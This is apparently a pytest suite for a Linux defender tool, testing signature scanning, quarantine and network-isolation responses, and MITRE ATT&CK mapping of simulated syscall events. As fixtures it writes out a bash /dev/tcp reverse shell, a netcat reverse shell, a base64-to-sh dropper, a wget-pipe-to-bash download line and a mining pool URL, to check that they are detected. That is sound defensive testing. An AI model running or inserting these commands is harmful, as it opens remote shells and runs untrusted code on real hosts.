"""
Comprehensive Linux / Ubuntu Defender Test Suite.
Verifies all capabilities:
1. Static Antivirus Signature & Hash Scanning
2. Linux Heuristic Reverse Shell, Dropper, & Miner Detection
3. On-Access Binary Scanning & Risk Elevation
4. Real-time Process & Memory behavioral anomaly detection (ptrace, RWX mprotect)
5. MITRE ATT&CK Mapping (T1055, T1003, T1041, T1071)
6. Response Engine OS Containment Execution (SIGSTOP, File Quarantine, Network Isolation)
7. REST API Endpoints (/api/health, /api/scan/file, /api/scan/directory, /api/actions/approve)
"""
import os
import shutil
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "response-engine"))

import pytest
from ai.scanner import SignatureEngine, ScanResult
from ai.graph_engine.graph_builder import BehavioralGraph
from ai.mitre_mapping.mapping_engine import MitreMapper
from policy_engine import ActionType, PolicyEngine, ResponseAction, ResponseExecutor, ResponseMode


@pytest.fixture
def scanner():
    return SignatureEngine()


@pytest.fixture
def executor():
    return ResponseExecutor()


# ==============================================================================
# 1. ANTIVIRUS & HEURISTIC ENGINE TESTS
# ==============================================================================

def test_scanner_detects_bash_reverse_shell(scanner):
    with tempfile.NamedTemporaryFile("wb", delete=False) as f:
        f.write(b"#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
        temp_path = f.name

    try:
        res = scanner.scan_file(temp_path)
        assert res.is_threat is True
        assert res.threat_name == "Linux.ReverseShell.BashDevTcp"
        assert res.severity == "CRITICAL"
        assert res.confidence >= 0.9
    finally:
        os.remove(temp_path)


def test_scanner_detects_netcat_reverse_shell(scanner):
    with tempfile.NamedTemporaryFile("wb", delete=False) as f:
        f.write(b"nc -e /bin/sh 192.168.1.50 8080\n")
        temp_path = f.name

    try:
        res = scanner.scan_file(temp_path)
        assert res.is_threat is True
        assert res.threat_name == "Linux.ReverseShell.Netcat"
        assert res.severity == "CRITICAL"
    finally:
        os.remove(temp_path)


def test_scanner_detects_cryptominer_config(scanner):
    with tempfile.NamedTemporaryFile("wb", delete=False) as f:
        f.write(b"stratum+tcp://xmr.pool.minergate.com:45700 --user test\n")
        temp_path = f.name

    try:
        res = scanner.scan_file(temp_path)
        assert res.is_threat is True
        assert "CoinMiner" in res.threat_name
        assert res.severity == "HIGH"
    finally:
        os.remove(temp_path)


def test_scanner_detects_base64_dropper(scanner):
    with tempfile.NamedTemporaryFile("wb", delete=False) as f:
        f.write(b"echo 'aGVsbG8gd29ybGQ=' | base64 -d | sh\n")
        temp_path = f.name

    try:
        res = scanner.scan_file(temp_path)
        assert res.is_threat is True
        assert res.threat_name == "Linux.Dropper.Base64Exec"
        assert res.severity == "CRITICAL"
    finally:
        os.remove(temp_path)


def test_scanner_reports_clean_for_benign_code(scanner):
    with tempfile.NamedTemporaryFile("wb", delete=False) as f:
        f.write(b"#!/usr/bin/env python3\nprint('Hello Ubuntu Security!')\n")
        temp_path = f.name

    try:
        res = scanner.scan_file(temp_path)
        assert res.is_threat is False
        assert res.severity == "CLEAN"
    finally:
        os.remove(temp_path)


def test_scanner_directory_scan(scanner):
    temp_dir = tempfile.mkdtemp()
    try:
        clean_file = os.path.join(temp_dir, "clean.sh")
        with open(clean_file, "w") as f:
            f.write("#!/bin/bash\necho 'clean'\n")

        mal_file = os.path.join(temp_dir, "malicious.sh")
        with open(mal_file, "w") as f:
            f.write("wget http://malware.site/payload | bash\n")

        threats = scanner.scan_directory(temp_dir)
        assert len(threats) == 1
        assert threats[0].threat_name == "Linux.Downloader.WgetPipeBash"
    finally:
        shutil.rmtree(temp_dir)


# ==============================================================================
# 2. OS CONTAINMENT & REMEDIATION TESTS
# ==============================================================================

def test_executor_quarantines_malicious_file(executor):
    with tempfile.NamedTemporaryFile("wb", delete=False) as f:
        f.write(b"malicious_payload_binary")
        target_path = f.name

    try:
        action = ResponseAction(
            response_id="act-test-01",
            action_type=ActionType.QUARANTINE_FILE,
            target={"path": target_path},
            triggered_by="policy:test-quarantine",
            mode=ResponseMode.RECOMMEND,
            status="awaiting_approval"
        )
        executed = executor.approve_and_execute(action, approved_by="soc_analyst")
        assert executed.status == "executed"
        assert "Quarantined" in executed.triggered_by
        assert not os.path.exists(target_path)  # Original file removed from source
    finally:
        if os.path.exists(target_path):
            os.remove(target_path)


def test_executor_network_isolation(executor):
    action = ResponseAction(
        response_id="act-test-02",
        action_type=ActionType.ISOLATE_NETWORK,
        target={"target_ip": "198.51.100.22"},
        triggered_by="policy:c2-isolation",
        mode=ResponseMode.RECOMMEND,
        status="awaiting_approval"
    )
    executed = executor.approve_and_execute(action, approved_by="soc_analyst")
    assert executed.status == "executed"
    assert "198.51.100.22" in executed.triggered_by


# ==============================================================================
# 3. BEHAVIORAL EDR & MITRE ATT&CK MAPPING
# ==============================================================================

def test_behavioral_attack_chain_evaluation():
    graph = BehavioralGraph("ubuntu-target-host")
    events = [
        {"event_id": 1, "host_id": "ubuntu-target-host", "syscall": "execve", "pid": 5001, "ppid": 1, "comm": "dropper", "time": "2026-08-31T10:00:00Z"},
        {"event_id": 2, "host_id": "ubuntu-target-host", "syscall": "mprotect", "pid": 5001, "comm": "dropper", "features": {"rwx_mprotect_flag": True}, "time": "2026-08-31T10:00:01Z"},
        {"event_id": 3, "host_id": "ubuntu-target-host", "syscall": "ptrace", "pid": 5001, "args": {"target_pid": 1100}, "comm": "dropper", "time": "2026-08-31T10:00:02Z"},
        {"event_id": 4, "host_id": "ubuntu-target-host", "syscall": "openat", "pid": 1100, "args": {"filename": "/etc/shadow"}, "comm": "target_proc", "time": "2026-08-31T10:00:03Z"},
    ]

    for e in events:
        graph.ingest_event(e)
    graph.propagate_risk()

    mapper = MitreMapper()
    matches = mapper.map_events(events, graph)

    technique_ids = {m.technique.technique_id for m in matches}
    assert "T1055" in technique_ids  # Process Injection
    assert "T1003" in technique_ids  # Credential Access (/etc/shadow)

    # Evaluate Policy recommendations
    risk = max(d.get("risk", 0.0) for _, d in graph.g.nodes(data=True))
    actions = PolicyEngine().evaluate(matches, risk, target={"pid": 5001})
    assert len(actions) > 0
    assert any(a.action_type == ActionType.ISOLATE_PROCESS for a in actions)
